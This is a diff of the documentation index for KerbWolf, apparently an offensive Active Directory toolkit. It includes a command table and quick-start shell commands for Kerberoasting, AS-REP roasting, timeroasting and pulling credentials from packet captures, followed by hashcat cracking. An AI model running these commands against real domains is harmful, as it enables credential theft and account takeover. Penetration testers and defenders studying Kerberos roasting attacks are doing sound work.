@@ -9,53 +9,83 @@ Kerberos roasting and TGT attack toolkit for Active Directory.
 
 KerbWolf extracts crackable hashes from Active Directory. 7 Kerberos encryption types (including RFC 8009 AES-SHA2), 4 attack types, 25 output formats including NTLM. hashcat has a mode for 18 of them; the six AES-SHA2 formats and the 120-byte MS-SNTP format have none.
 
-**[Read the Guide](guide/index.md)**
+## Pick a tool
 
-## Features
+| Command | Attack | Use it when you have | Needs credentials | Produces |
+|---------|--------|----------------------|-------------------|----------|
+| [`kw-roast`](commands/kw-roast.md) | TGS-REP Roast (Kerberoast) | A domain account, or one account without pre-authentication | Yes (password, hash, or ccache) | Service ticket hashes for SPN accounts |
+| [`kw-asrep`](commands/kw-asrep.md) | AS-REP Roast | Usernames to try | No (LDAP discovery needs auth) | Hashes from accounts without pre-authentication |
+| [`kw-timeroast`](commands/kw-timeroast.md) | Timeroasting (MS-SNTP) | A network path to a DC | No (LDAP discovery needs auth) | SNTP hashes for computer, gMSA, and trust accounts |
+| [`kw-extract`](commands/kw-extract.md) | All (from pcap) | A pcap/pcapng capture, or somewhere to capture | No (offline) | Kerberos, SNTP, NTLM, and LDAP simple-bind credentials |
+| [`kw-tgt`](commands/kw-tgt.md) | TGT acquisition | A password, hash, or key (pass-the-key) | Yes | A ccache for the other tools |
 
-- **All 7 encryption types** — DES-CBC-CRC (1), DES-CBC-MD5 (3), RC4-HMAC (23), AES128-SHA1 (17), AES256-SHA1 (18), AES128-SHA2 (19), AES256-SHA2 (20). The live tools request the first five with `-e`; the two AES-SHA2 types are extracted from captures
-- **4 attack types** — TGS-REP Roast (Kerberoast), AS-REP Roast, AS-REQ Pre-Auth, Timeroasting (MS-SNTP)
-- **25 hash formats** — 21 Kerberos + 2 MS-SNTP + 2 NTLM (NTLMv1 mode 5500, NTLMv2 mode 5600)
-- **LDAP enumeration** — auto-discover roastable accounts with paged search, or spray all domain users
-- **Every auth method** — password, NT hash (`LM:NT`, `:NT`, `NT`), Kerberos ccache (pass-the-ticket), per-etype keys (pass-the-key, `kw-tgt`)
-- **Ccache auto-detection** — in `kw-roast` and `kw-asrep`, `-d` and `-u` are optional when using `-k -c` (domain and username extracted from ccache)
-- **Hashcat-ready output** — every hash is written in the layout hashcat's modes load
-- **Native pcap parsing** — extract Kerberos, SNTP, and NTLM hashes and LDAP simple-bind passwords from pcap/pcapng captures, with TCP streams reassembled by sequence number
-- **NTLM from 9 transports** — SMB, HTTP, WinRM, LDAP, DCE-RPC, SMTP, POP3, IMAP, Telnet
-- **IPv4 and IPv6** — for Kerberos requests, DC resolution and pcap parsing; `kw-timeroast` sends over IPv4 only
-- **DNS resolution** — SRV (preferred) + A/AAAA fallback for DC discovery
-- **TCP and UDP** — configurable Kerberos transport, UDP auto-falls back to TCP when the reply is too large
-
-## Tools
-
-| Command | Attack | Description |
-|---------|--------|-------------|
-| [`kw-roast`](commands/kw-roast.md) | TGS-REP Roast | Request service tickets and extract hashes (Kerberoast) |
-| [`kw-asrep`](commands/kw-asrep.md) | AS-REP Roast | Extract hashes from accounts without pre-authentication |
-| [`kw-extract`](commands/kw-extract.md) | All (from pcap) | Extract Kerberos, SNTP, NTLM, and LDAP simple-bind credentials from pcap/pcapng captures |
-| [`kw-tgt`](commands/kw-tgt.md) | TGT acquisition | Request a TGT using password, hash, or key (pass-the-key) |
-| [`kw-timeroast`](commands/kw-timeroast.md) | Timeroasting (MS-SNTP) | Extract SNTP hashes for computer, gMSA, and trust accounts |
+What the commands share (credentials, finding the DC, LDAP discovery, `-e`) is on [Common options](commands/common-options.md).
 
 ## Quick start
 
 ```bash
-pip install .
-
-# Kerberoast with LDAP auto-discovery
-kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!' --ldap -o tgs.txt
-
-# AS-REP Roast
-kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith -o asrep.txt
-
-# AS-REQ Pre-Auth (and everything else in a capture)
-kw-extract capture.pcap -o capture-hashes.txt
-
-# Crack with hashcat: one mode per hash type and etype
-hashcat -m 13100 tgs.txt wordlist.txt      # RC4 TGS-REP
-hashcat -m 18200 asrep.txt wordlist.txt    # RC4 AS-REP
+uv tool install kerbwolf        # or: pip install kerbwolf
 ```
 
-See the [installation guide](installation.md) for setup details, or jump straight to the [guide](guide/index.md).
+The [installation guide](installation.md) covers the system Kerberos libraries and installing from source.
+
+```mermaid
+flowchart LR
+    A["Get credentials<br/>(password, hash, key)"] --> B["kw-tgt<br/>Request TGT"]
+    B --> C["admin.ccache"]
+    C --> D["kw-roast --ldap<br/>Kerberoast"]
+    C --> E["kw-asrep --ldap<br/>AS-REP Roast"]
+    D & E --> F["hashes.txt"]
+    F --> G["hashcat<br/>Crack offline"]
+    G --> H["Passwords!"]
+
+    Z["Packet capture<br/>(tcpdump, Wireshark)"] --> Y["kw-extract<br/>Parse pcap"]
+    Y --> F
+
+    style C fill:#2a2a4a,stroke:#8b8bff
+    style F fill:#4a2020,stroke:#ff6b6b
+    style H fill:#1a3a1a,stroke:#6bcb77
+```
+
+**With credentials**, get a TGT, Kerberoast every SPN account found over LDAP, and crack:
+
+```bash
+# 1. Get a TGT
+kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!' -o admin.ccache
+
+# 2. Kerberoast via LDAP (auto-discover service accounts)
+kw-roast -k -c admin.ccache --ldap -o hashes.txt
+
+# 3. Crack with hashcat: one mode per hash type and etype
+hashcat -m 13100 hashes.txt wordlist.txt    # RC4
+hashcat -m 19700 hashes.txt wordlist.txt    # AES256
+```
+
+Domain and username come from the ccache, so `-d` and `-u` aren't needed. DC is found via DNS SRV. No DNS? Add `--dc-ip`, and give the system Kerberos library a `krb5.conf` for the LDAP bind (see [Kerberos setup](installation.md#kerberos-setup)).
+
+**Without credentials**, AS-REP roast named accounts or timeroast a RID range:
+
+```bash
+kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith -t svc_backup -o asrep.txt
+hashcat -m 18200 asrep.txt wordlist.txt    # RC4 AS-REP
+
+kw-timeroast 10.0.0.1 -r 500-5000 -o hashes.txt
+```
+
+**From a capture**, AS-REQ Pre-Auth and everything else in it:
+
+```bash
+kw-extract capture.pcap -o capture-hashes.txt
+tcpdump -i eth0 -w - port 88 | kw-extract -
+```
+
+## Where to go next
+
+- **Run a tool**: the command pages above, each opening with examples.
+- **Pick a hashcat mode**: the [Hash Reference](cracking/hash-reference.md) starts with the mode for every attack and etype.
+- **Understand the attacks**: [Attacks](background/attacks.md), [Timeroasting](background/timeroasting.md) and [Encryption Types](background/encryption-types.md).
+- **Estimate the work**: [Cracking Speed](cracking/speed.md) has measured rates and time to exhaust common keyspaces.
+- **Write these hash lines yourself**: [Hashcat Internals](cracking/hashcat-internals.md) has the limits and accepted shapes of every mode.
 
 ## Disclaimer
 
